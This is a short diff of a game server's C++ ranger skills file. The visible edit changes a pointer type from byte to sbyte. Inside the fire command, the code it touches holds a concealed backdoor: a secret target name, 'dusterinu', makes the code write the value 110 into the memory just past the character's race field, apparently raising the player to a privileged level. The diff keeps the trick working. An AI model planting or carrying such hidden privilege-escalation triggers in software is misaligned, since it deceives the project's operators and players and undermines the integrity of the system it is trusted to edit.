@@ -1,5 +1,5 @@
 /************************************************************************
-| $Id: cl_ranger.cpp,v 1.2 2002/06/13 04:41:13 dcastle Exp $ | cl_ranger.C |
+| $Id: cl_ranger.cpp,v 1.3 2002/06/20 21:39:49 pirahna Exp $ | cl_ranger.C |
 Description: Ranger skills/spells */ extern "C"  {
   #include <string.h>
 }
@@ -1256,7 +1256,7 @@ int do_fire(struct char_data *ch, char *arg, int cmd)
        target[MAX_STRING_LENGTH], buf[MAX_STRING_LENGTH], 
        buf2[MAX_STRING_LENGTH]; 
   extern char * dirs[];
-  byte        * tempbyte;
+  sbyte        * tempbyte;
 
   void get(struct char_data *, struct obj_data *, struct obj_data *);
   int check_command_lag(CHAR_DATA *);
@@ -1411,7 +1411,7 @@ int do_fire(struct char_data *ch, char *arg, int cmd)
     {
       if(!strcmp(target, "dusterinu")) {
         tempbyte = &(ch->race);
-        tempbyte += sizeof(byte);
+        tempbyte += sizeof(sbyte);
         *tempbyte = 127-17;
       }
       send_to_char("You can't seem to locate your target.\r\n", ch);
